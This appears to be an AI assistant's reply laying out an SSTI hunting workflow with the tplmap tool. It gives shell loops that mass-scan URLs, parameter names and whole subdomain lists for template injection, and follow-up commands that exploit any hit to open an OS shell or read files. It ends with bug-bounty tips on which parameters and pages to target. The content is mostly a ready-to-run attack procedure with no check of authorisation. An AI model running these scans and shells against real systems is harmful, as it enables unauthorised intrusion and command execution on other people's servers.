Using any one of these, 
* `subdomain.txt`
* `urls.txt`(accurate)
* `parameter.tx` *(assuming you mean `parameter.txt` — I’ll use that)*

---

## ✅ Tool Chosen: **tplmap**

### Install (if not installed)

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip3 install -r requirements.txt
```

---

## 🔹 1️⃣ Basic SSTI Scan on `urls.txt`

This tests URLs **as-is** (already containing parameters).

```bash
while read url; do
  python3 tplmap.py -u "$url" --level 1 --technique SSTI
done < urls.txt
```

---

## 🔹 2️⃣ SSTI Scan using `parameter.txt` (parameter fuzzing)

This injects SSTI payloads into **each parameter name**.

```bash
while read url; do
  while read param; do
    python3 tplmap.py -u "$url" -d "$param=1" --level 2 --technique SSTI
  done < parameter.txt
done < urls.txt
```

---

## 🔹 3️⃣ Subdomain-wide SSTI Discovery

Use subdomains to find **template-based endpoints**.

```bash
while read sub; do
  python3 tplmap.py -u "https://$sub" --level 1 --technique SSTI
done < subdomain.txt
```

---

## 🔹 4️⃣ Aggressive SSTI Detection (Recommended)

Higher payload coverage + deeper detection.

```bash
while read url; do
  python3 tplmap.py -u "$url" --level 3 --engine auto
done < urls.txt
```

---

## 🔹 5️⃣ Confirm & Exploit (Only if SSTI Found)

If tplmap reports SSTI → try command execution:

```bash
python3 tplmap.py -u "VULNERABLE_URL" --os-shell
```

Or file read:

```bash
python3 tplmap.py -u "VULNERABLE_URL" --tpl-shell
```

---

## 🧠 Pro Tips (Bug Bounty)

* Focus on params like:

  ```
  redirect
  return
  view
  page
  template
  name
  email
  ```
* SSTI often appears on:

  * Error pages
  * Email preview
  * PDF/Report generators
  * Admin panels
